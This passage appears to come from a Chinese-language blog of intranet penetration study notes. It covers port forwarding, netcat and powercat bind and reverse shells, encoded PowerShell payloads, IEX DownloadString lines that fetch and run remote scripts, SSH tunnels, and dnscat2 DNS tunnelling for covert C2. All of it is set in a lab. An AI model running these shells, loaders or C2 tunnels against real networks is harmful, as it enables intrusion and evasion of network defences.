<pre class="line-numbers language-none"><code class="language-none">#在目标机器上执行如下命令，将目标机器3389端口的所有数据转发到公网VPS的4444端口上
#内网失陷主机
lcx.exe -slave 123.123.123.123 4444 127.0.0.1 3389

#在VPS上执行如下命令，将本机4444端口上监听的所有数据转发到本机的5555端口上
#公网代理主机
lcx.exe -listen 4444 5555

#在建立连接后，访问公网代理主机的5555端口就能访问到内网失陷主机的3389端口了
#此时，用mstsc登录“&lt;公网主机IP地址&gt;:5555”，或者在VPS上用mstsc登录主机127.0.0.1的5555端口，即可访问目标服务器的3389端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里顺便对几个渗透常用术语解释一下</p>
<ul>
<li>“rhost&quot;代表&quot;remote host”，指的是远程主机或远程服务器</li>
<li>“lhost&quot;代表&quot;local host”，指的是本地主机或本地计算机</li>
<li>“rport&quot;代表&quot;remote port”，指的是远程端口号</li>
<li>“lport&quot;代表&quot;local port”，指的是本地端口号</li>
<li>“MSTSC” 是 Microsoft 远程桌面连接（Microsoft Remote Desktop Connection）的缩写</li>
<li>VPS【可以简单视作云服务器，VPS就是云服务器的一种实现方式】</li>
</ul>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231105134843614.png" alt="image-20231105134843614"></p>
<h5 id="本地端口映射">本地端口映射</h5>
<p>如果目标服务器由于防火墙的限制，部分端口(例如 3389)的数据无法通过防火墙，可以将目标服务器相应端口的数据映射到防火墙允许的其他端口(例如 53)，在目标主机上执行如下命令，就可以直接从远程桌面连接目标主机的53端口。【如果目标主机的某个端口不能出网，这时可以利用其能够出网的端口，将不能出网的主机端口映射到自身能够出网的端口，再借助端口转发到公网进行访问】</p>
<pre class="line-numbers language-none"><code class="language-none">lcx.exe -tran 53 &lt;目标主机 IP 地址&gt; 3389
#将本地主机的53端口映射到3389上【意味着当你在本地主机上发送请求到 53 端口（本地主机），lcx.exe 将会捕获这些请求，并将它们转发到目标主机的 3389 端口上】<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="linux下-2">linux下</h4>
<h5 id="内网端口转发-2">内网端口转发</h5>
<pre class="line-numbers language-none"><code class="language-none">#内网失陷主机
.&#x2F;portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 &lt;公网主机 IP&gt; -p2 4444
#公网代理主机
.&#x2F;portmap -m 2 -p1 4444 -h2 &lt;公网主机 IP&gt; -p2 5555
#此时访问公网主机 IP 的 5555 端口，就会访问到内网失陷主机的 22 端口了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="netcat">netcat</h3>
<p>说明：nc 全称 netcat，它的功能很多，下面简单记录下几个常用的功能。</p>
<p>nc 下载地址：<a target="_blank" rel="noopener" href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p>
<h4 id="获取-banner-信息">获取 banner 信息</h4>
<pre class="line-numbers language-none"><code class="language-none">#不仅可以用来查看 banner 信息，还能用来判断端口是否开放
nc -vv rhost rport<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="直连shell-正向shell">直连shell(正向shell)</h4>
<ul>
<li>-e直连 shell</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none"># 失陷主机
nc -lvp lport -e &#x2F;bin&#x2F;bash        # linux 主机
nc -lvp lport -e c:\windows\system32\cmd.exe     # windows 主机
# 控制端
nc -v rhost rport<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>-c 直连 shell</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none"># 失陷主机
nc -lvp lprot -c &#x2F;bin&#x2F;bash    # linux 主机
nc -lvp lport -c c:\windows\system32\cmd.exe     # windows 主机

# 控制端
nc -v rhost rport<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>补充，使用nc简易聊天</p>
<pre class="line-numbers language-none"><code class="language-none">nc -l -p 888
nc -vn 192.168.1.4 888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="powercat">powercat</h3>
<p>说明：powercat可以视作nc的PowerShell版本</p>
<p>powercat下载地址：<a target="_blank" rel="noopener" href="https://github.com/besimorhino/powercat.git">https://github.com/besimorhino/powercat.git</a></p>
<pre class="line-numbers language-none"><code class="language-none">#下载下来 powercat.ps1 文件后，直接导入即可
Import-Module .\powercat.ps1
#如果提示未能加载指定模块，则可能是PowerShell开启了受限模式
Set-ExecutionPolicy Unrestricted
#之后就可以导入 powercat 了，导入成功后，输入 powercat -h 可以看到帮助信息

#如果没有权限，也可以直接下载远程文件进行绕过
IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;)
powercat -h
#不过由于github在国内可能会无法打开，因此可以使用web代理站点或者把powercat.ps1文件放到自己的服务器上进行下载<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>powercat 命令参数</p>
<pre class="line-numbers language-none"><code class="language-none">-l   监听模式
-p   指定监听端口
-e   指定启动进程的名称
-v   显示详情
-c   指定想要连接的 IP 地址
-ep  返回 powershell
-dns 使用 dns 通信
-g   生成 payload
-ge  生成经过编码的 payload，可以直接使用 powershell -e 执行该 payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="正向shell">正向shell</h4>
<pre class="line-numbers language-none"><code class="language-none">#靶机开启监听，等待 Kali 连接
powercat -l -v -p lport -e cmd.exe
#Kali 上的 nc 连接到靶机
nc -v rhost rport<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="反向shell">反向shell</h4>
<pre class="line-numbers language-none"><code class="language-none">#Kali 上开启监听
nc -lvp 4444
#靶机向 kali 发起连接
powercat -c rhost -p rport -e cmd.exe

#若要返回 powershell
#攻击机上运行
powercat -l -v -p lport
#靶机上运行
powercat -c rhost -p rport -v -ep<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231105230918828.png" alt="image-20231105230918828"></p>
<h4 id="作为跳板使用">作为跳板使用</h4>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231105231323107.png" alt="image-20231105231323107"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231107165453671.png" alt="image-20231107165453671"></p>
<h4 id="文件传输">文件传输</h4>
<pre class="line-numbers language-none"><code class="language-none">#接收文件
powercat -l -p 9999 -of test.txt -v 
#提供文件
powercat -c 10.10.10.129 -p 9999 -i c:\test.txt -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="生成-payload">生成 payload</h4>
<h5 id="正向shell-2">正向shell</h5>
<pre class="line-numbers language-none"><code class="language-none">#在攻击机上运行以下命令生成 shell.ps1 payload 文件
powercat -l -p 4444 -e cmd -g &gt; shell.ps1
#将 shell.ps1 文件拷贝到目标主机上后，执行 shell.ps1 文件
#之后在攻击机上运行以下命令即可获得 shell
#powercat -c rhost -p rport -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="反向shell-2">反向shell</h5>
<pre class="line-numbers language-none"><code class="language-none">#在攻击机上生成 ps1 文件，并开启监听	
powercat -c rhost -p rport -ep -g &gt; shell.ps1
powercat -l -p 4444 -v
#之后在靶机上，运行 ps1 文件就会上线了

#如果不想生成文件，也可以使用 -ge 生成经过编码的 payload
powercat -c 172.16.214.2 -p 4444 -ep -ge
powercat -l -p 4444 -v
#在靶机上执行刚生成的 payload
powershell -e payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/640-1699236446108-3.png" alt="图片"></p>
<h4 id="建立-dns-隧道连接">建立 dns 隧道连接</h4>
<p>powercat 的 dns 隧道是基于 dnscat 设计的，因此在服务端需要使用 dnscat 连接。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231106101234763.png" alt="image-20231106101234763"></p>
<h3 id="socat">socat</h3>
<p>socat 下载地址：<a target="_blank" rel="noopener" href="http://www.dest-unreach.org/socat/%EF%BC%8C%E6%88%96%E8%80%85%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8">http://www.dest-unreach.org/socat/，或者直接使用</a> apt-get install socat 安装，Mac 可使用 brew install socat 安装。socat 全称 socket cat，可以视为 nc 的加强版</p>
<h4 id="文件操作">文件操作</h4>
<pre class="line-numbers language-none"><code class="language-none">#读取文件
socat - .&#x2F;test.txt
#写入文件
echo &quot;hello world&quot; | socat - .&#x2F;test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="网络操作">网络操作</h4>
<pre class="line-numbers language-none"><code class="language-none">#连接远程端口
socat - TCP:172.16.214.1:22
#监听端口
socat - TCP-LISTEN:8002<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="端口转发">端口转发</h4>
<pre class="line-numbers language-none"><code class="language-none">#转发 TCP 端口
socat TCP4-LISTEN:80,fork TCP4:123.123.123.123:80
#这样在访问当前主机的80端口时，就会访问到123.123.123.123的80端口了，也可以使用-d调整输出信息的详细程度，最多使用四个d，推荐使用两个，即-dd，如下
socat -dd TCP4-LISTEN:80,fork TCP4:123.123.123.123:80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231105173340424.png" alt="image-20231105173340424"></p>
<pre class="line-numbers language-none"><code class="language-none">#转发 UDP 端口
socat UDP4-LISTEN:80,fork UDP4:123.123.123.123:80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="NAT映射">NAT映射</h4>
<pre class="line-numbers language-none"><code class="language-none">#通过 socat 也可以将内网端口映射到公网上，不过这种场景还是更推荐用 frp

# 内网主机
socat tcp:123.123.123.123:4444 tcp:127.0.0.1:3389

# 公网主机
socat tcp-listen:4444 tcp-listen:5555

#此时访问公网主机的 5555 端口就可以访问到内网主机的 3389 端口了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231105173829130.png" alt="image-20231105173829130"></p>
<h2 id="5、应用层隧道技术">5、应用层隧道技术</h2>
<p>应用层的隧道通信技术主要利用应用软件提供的端口来发送数据</p>
<h3 id="SSH协议">SSH协议</h3>
<p>SSH 全称 <code>Secure Shell</code>，SSH 协议是一种应用层协议，支持几乎所有 UNIX、Linux 平台。<mark>得益于 SSH 协议在传输过程中都是加密，所以在流量层面也较难区分合法的 SSH 流量和攻击者产生的 SSH 流量</mark></p>
<p>拿 SSH 来创建隧道则需要用到下面的参数</p>
<pre class="line-numbers language-none"><code class="language-none">-C 压缩传输，提高传输速度。
-f 将 SSH 传输转入后台执行，不占用当前 shell
-N 建立静默连接（建立了连接但看不到具体会话）
-g 允许远程主机连接本地用于转发的端口。
-L 本地端口转发
-R 远程端口转发
-D 动态转发（ SOCKS 代理）
-p 指定 SSH 端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="本地转发">本地转发</h4>
<p>目前有这样的一个环境，外网有一台攻击主机 ，可访问处于内网环境的 Web 服务器（双网卡），但无法访问 Web 服务器所在内网的办公主机，接下来就用 SSH 进行流量转发，使外网的攻击主机通过 Web 服务器访问到位于内网的办公主机。</p>
<p>环境拓扑如下：</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231107134425645.png" alt="image-20231107134425645"></p>
<p>在攻击主机上执行以下命令，将内网办公主机的 3389 端口映射到自己的 3388 端口上</p>
<pre class="line-numbers language-none"><code class="language-none">#ssh -CfNg -L 攻击主机端口:内网办公主机IP:内网办公主机端口 Web服务器ssh用户名@Web服务器IP
ssh -CfNg -L 3388:192.168.7.110:3389 root@172.16.214.5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这条命令的意思就是将 Web 服务器 172.16.214.5 作为跳板，将内网办公主机的 3389 端口转发到攻击主机的 3388 端口，这样只要访问攻击主机的 3388 端口就会访问到内网办公主机的 3389 端口了。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231106132634189.png" alt="image-20231106132634189"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/640-1699248407693-3.png" alt="图片"></p>
<h4 id="远程转发">远程转发</h4>
<p>远程转发在这里其实也可以说是反向代理，目前有这样的一个环境：内网中不存在边界设备，但是内网的 Web 服务器能访问到攻击主机，而内网的办公主机则不行。</p>
<p>因此可以在拿到 Web 服务器的 Shell 后，采用远程转发的方式，即利用 Web 服务器 SSH 连接到攻击主机上进行代理转发，然后访问攻击主机的端口即可，拓扑图如下：</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/640-1699249342851-6.png" alt="图片"></p>
<p>将 Web 服务器作为跳板，进行远程转发</p>
<pre class="line-numbers language-none"><code class="language-none">#ssh -CfNg -R 攻击主机端口:内网办公主机IP:内网办公主机端口 攻击主机ssh用户名@攻击主机IP
ssh -CfNg -R 3388:192.168.7.110:3389 root@172.16.214.48<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231106134315909.png" alt="image-20231106134315909"></p>
<h4 id="动态转发">动态转发</h4>
<p>动态转发需要攻击主机能够访问到目标主机，因此这里采用和本地转发一样的拓扑进行演示。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231107134425645.png" alt="image-20231107134425645"></p>
<p>在攻击主机上执行下面的命令</p>
<pre class="line-numbers language-none"><code class="language-none">#ssh -CfNg -D 攻击主机端口 Web服务器ssh用户名@Web服务器IP
ssh -CfNg -D 4444 root@172.16.214.5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231106140916444.png" alt="image-20231106140916444"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231106140938409.png" alt="image-20231106140938409"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/640-1699251000518-14.png" alt="图片"></p>
<p>可以看到<mark>动态转发要比本地转发自由度高出不少，借助动态转发可以访问到内网 Web 服务器能访问的所有地址、端口，没有了本地转发只能访问单个IP、端口的限制</mark>。</p>
<h4 id="SSH-隧道攻击的防御">SSH 隧道攻击的防御</h4>
<p>对 SSH 进行双向访问控制策略可以避免这些问题，一方面只允许可信 IP 才能连接，一方面只允许连接到可信 IP。</p>
<h3 id="HTTP-HTTPS协议">HTTP/HTTPS协议</h3>
<p>常见的代理工具：</p>
<ul>
<li>reGeorg</li>
<li>meterpreter</li>
<li>tunna</li>
<li>suo5</li>
</ul>
<h3 id="DNS协议">DNS协议</h3>
<p>DNS协议是一种请求/应答协议，也是一种可用于应用层的隧道技术。<mark>虽然激增的DNS 流量可能会被发现，但基于传统 Socket 隧道已经濒临淘汰及TCP、UDP 通信大量被防御系统拦截的状况，DNS、ICMP、HTTP/HTTPS 等难以被禁用的协议已成为攻击者控制隧道的主流渠道</mark>。一方面，在网络世界中，DNS是一个必不可少的服务；另一方面，<mark>DNS 报文本身具有穿透防火墙的能力。由于防火墙和入侵检测设备大都不会过滤 DNS 流</mark>，也为 DNS 成为隐蔽信道创造了条件。用于管理僵尸网络和进行APT攻击的服务器叫作C&amp;C服务器(Commandand Control Server.命令及控制服务器)。C&amp;C节点分为两种，分别是C&amp;C服务端(攻击者)和C&amp;C客户端(被控制的计算机)。<mark>C&amp;C通信是指植入C&amp;C 客户端的木马或者后门程序与C&amp;C服务端上的远程控制程序之间的通信</mark>。正常网络之间的通信，都是在两台机器之间建立TCP连接后进行的。在进行数据通信时：如果目标是IP地址，可以直接发送报文；如果目标是域名，会先将域名解析成IP地址，再进行通信。两台机器建立连接后，C&amp;C服务端就可以将指令传递给C&amp;C客户端上的木马(后门)程序让其受到控制。<mark>内网中安装了各种软/硬件防护设施来检查主机与外部网络的连接情况。很多厂商会收集C&amp;C服务端的域名、IP 地址、URL 等数据，帮助防火墙进行阻断操作</mark>。这样一来，C&amp;C通信就会被切断。于是，通过各种隧道技术实现 C&amp;C 通信的技术(特别是DNS 隧道技术)出现了。DNS隧道的工作原理很简单：<mark>在进行DNS查询时，如果查询的域名不在DNS服务器本机的缓存中，就会访问互联网进行查询，然后返回结果</mark>。如果在互联网上有一台定制的服务器，那么依靠DNS协议即可进行数据包的交换。<mark>从DNS协议的角度看，这样的操作只是在一次次地查询某个特定的域名并得到解析结果，但其本质问题是，预期的返回结果应该是一个IP地址，而事实上不是，返回的可以是任意字符串，包括加密的C&amp;C指令</mark>【C&amp;C又称C2，是一个意思】</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231106115743751.png" alt="image-20231106115743751"></p>
<p>在使用DNS隧道与外部进行通信时，从表面上看是没有接连外网的(内网网关没有转发IP数据包)，但实际上，内网的DNS服务器进行了中转操作。这就是DNS隧道的工作原理，简单地说，就是将其他协议封装在DNS协议中进行传输。下面做一个更深层次的理解：</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231106111114472.png" alt="image-20231106111114472"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231106111151006.png" alt="image-20231106111151006"></p>
<h4 id="DNS迭代查询">DNS迭代查询</h4>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231107130152749.png" alt="image-20231107130152749"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231107130231757.png" alt="image-20231107130231757"></p>
<h4 id="DNS记录">DNS记录</h4>
<p>域名可以和指定的 IP 进行关联，进而充当 IP 的别名。我们通过域名来访问网络服务时，域名系统会帮我们将域名解析成对应的 IP 地址。域名是否只能关联 IP 地址呢？其实并不是。<mark>除了 IP 地址，域名还可以关联其他类型的信息</mark>。实际上，域名和与之关联的信息，就构成了一条 DNS记录（ <em>DNS record</em> ）。DNS记录可以理解成一个键值对：</p>
<ul>
<li>键：域名</li>
<li>值：与域名关联的值</li>
</ul>
<p>除了 IP 地址，DNS记录值还可以是 IPv6 地址、别名、文本等等。据此，DNS记录可分为若干不同类型，包括：</p>
<ul>
<li>A：主机 IP 地址</li>
<li>AAAA：主机 IPv6 地址</li>
<li>ALIAS：自动解析的别名（ alias ）</li>
<li>CNAME：别名的权威名称（ canonical name ）</li>
<li>MX：邮件交换服务器（ Mail eXchange ）</li>
<li>NS：域名服务器（ name server ）</li>
<li>TXT：描述文本</li>
</ul>
<blockquote>
<p>记录类型也就是 DNS 报文中，问题记录和资源记录的类型（ Type ）</p>
</blockquote>
<p>下面对几种DNS记录类型进行详细解释</p>
<ol>
<li>AAAA记录</li>
</ol>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231106220835456.png" alt="image-20231106220835456"></p>
<ol start="2">
<li>CNAME记录</li>
</ol>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231106221040171.png" alt="image-20231106221040171"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231106221211817.png" alt="image-20231106221211817"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231106221253467.png" alt="image-20231106221253467"></p>
<ol start="3">
<li>MX记录</li>
</ol>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231106222328258.png" alt="image-20231106222328258"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231106222301635.png" alt="image-20231106222301635"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231106222726833.png" alt="image-20231106222726833"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231106222842069.png" alt="image-20231106222842069"></p>
<ol start="4">
<li>NS记录</li>
</ol>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231106231755758.png" alt="image-20231106231755758"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231106231823499.png" alt="image-20231106231823499"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231106231937797.png" alt="image-20231106231937797"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231106232007968.png" alt="image-20231106232007968"></p>
<ol start="5">
<li>TXT记录</li>
</ol>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231107144406339.png" alt="image-20231107144406339"></p>
<h4 id="常见的DNS隧道工具">常见的DNS隧道工具</h4>
<ul>
<li>dnscat2</li>
<li>iodine</li>
</ul>
<h4 id="查看DNS的连通性">查看DNS的连通性</h4>
<p>要使用DNS隧道，就需要先知道当前服务器是否允许通过内部 DNS 解析外部域名，也就是要测试 DNS 的连通性</p>
<pre class="line-numbers language-none"><code class="language-none">#查询当前内部域名及IP 地址
cat &#x2F;etc&#x2F;resolv.conf | grep -v &#39;#&#39;

#查看能否与内部DNS通信
nslookup 上面查询到的当前内部域名

#查看能否通过内部DNS服务器解析外部域名
nslookup baidu.com
#若能，则意味着可以使用DNS隧道实现隐蔽通信<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="dnscat2">dnscat2</h4>
<p>dnscat2下载地址：<a target="_blank" rel="noopener" href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a></p>
<ul>
<li>
<p>dnscat2 是一款开源C2 工具，与常规 C2 工具不同的是它利用了 DNS 协议来创建加密的 C2 通道</p>
</li>
<li>
<p>dnacat2 的客户端由 C 语言编写，服务端由 Ruby 语言编写，<mark>在攻击主机上开启服务端后，客户端放到目标主机上执行相关命令，攻击主机就能够收到来自客户端的会话了</mark>。</p>
</li>
<li>
<p>dnscat2 有两种使用模式，一是直连模式，二是中继模式，区别如下：</p>
<ul>
<li>
<p>直连模式：客户端直接向指定 IP 地址的 DNS 服务器发起 DNS 解析请求</p>
</li>
<li>
<p>中继模式：像平时上网一样，DNS 先经过互联网的解析，最终指向我们的恶意 DNS 服务器，与直连模式相比速度较慢但是更安全。</p>
</li>
</ul>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231106201822667.png" alt="image-20231106201822667"></p>
</li>
</ul>
<p>在安全策略做的比较严格的内网中，<mark>如果发现只允许白名单流量出站，而且内网中还有诸多安全设备，同时在传统的 C2 通信无法建立的情况下，就可以尝试使用 DNS 协议建立 C2 通信</mark>。</p>
<h5 id="dnscat2服务端安装">dnscat2服务端安装</h5>
<pre class="line-numbers language-none"><code class="language-none">#这里以 Ubuntu 为例
git clone https:&#x2F;&#x2F;github.com&#x2F;iagox86&#x2F;dnscat2.git
cd dnscat2&#x2F;server&#x2F;
sudo gem install bundler
bundle install
#如果运行 sudo gem install bundler 提示 Command &#39;gem&#39; not found，则需要先安装 ruby
#sudo apt-get install ruby
#如果运行 bundle install 提示 Gem::Ext::BuildError: ERROR: Failed to build gem native extension.，则需要先安装 ruby-dev
#sudo apt-get install ruby-dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="dnscat2客户端安装">dnscat2客户端安装</h5>
<pre class="line-numbers language-none"><code class="language-none">#dnscat2 客户端在使用前需要进行编译才能使用，在 Windows 中可以使用 VS 进行编译或者直接使用 PowerShell 的版本，Linux 中可以使用 make install 进行编译
#Linux 下可以通过以下方法进行编译
git clone https:&#x2F;&#x2F;github.com&#x2F;iagox86&#x2F;dnscat2.git
cd dnscat2&#x2F;client&#x2F;
make

#Windows 可以直接下载已经编译好的版本
#exe 版（解压密码：password）：https:&#x2F;&#x2F;downloads.skullsecurity.org&#x2F;dnscat2&#x2F;dnscat2-v0.07-client-win32.zip
#PowerShell版：https:&#x2F;&#x2F;github.com&#x2F;lukebaggett&#x2F;dnscat2-powershell

#如果使用 PowerShell 版，可以直接使用下面的命令导入，在实际情况中，也更推荐使用 PowerShell 版的，毕竟隐蔽性要更好些。
IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;lukebaggett&#x2F;dnscat2-powershell&#x2F;master&#x2F;dnscat2.ps1&#39;)
#或者下载 ps1 文件后，使用以下命令导入
Import-Module .\dnscat2.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="dnscat2使用">dnscat2使用</h5>
<h6 id="直连模式">直连模式</h6>
<pre class="line-numbers language-none"><code class="language-none">#启动服务端，这里服务端 IP 为 172.16.214.50
cd &#x2F;dnscat2&#x2F;server
sudo ruby .&#x2F;dnscat2.rb -s 553 -c teamssix --no-cache<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231106204537417.png" alt="image-20231106204537417"></p>
<pre class="line-numbers language-none"><code class="language-none">#启动客户端，这里以 Windows 下的 exe 版为例
dnscat --dns server&#x3D;172.16.214.50,port&#x3D;553 --secret&#x3D;teamssix
